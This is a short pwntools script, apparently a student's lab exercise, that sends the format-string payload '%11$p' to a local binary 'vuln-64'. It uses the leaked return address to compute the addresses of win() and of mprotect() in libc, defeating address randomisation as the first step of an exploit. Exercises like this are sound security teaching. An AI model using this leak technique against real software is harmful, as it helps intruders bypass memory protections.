# Maximiliano brizzio
# I pledge my honor that I have abided by the Stevens Honor System.



from pwn import *

context(os='linux', arch='amd64')
io = process('./vuln-64')

#win address offset
win_offset = 331

#gets address of win()
io.sendline(b'%11$p')
vfunc_ret_addr = int(io.recvline(), 16)
print("vfun_ret: ", hex(vfunc_ret_addr))
win_addr = hex(vfunc_ret_addr - win_offset)

#gets address of mprotect()
libc = io.libs()['/usr/lib/x86_64-linux-gnu/libc.so.6']
mprotect_addr = hex(libc + 0x1010f0)

print("win: ", win_addr)
print("mprotect: ", mprotect_addr)


io.close()
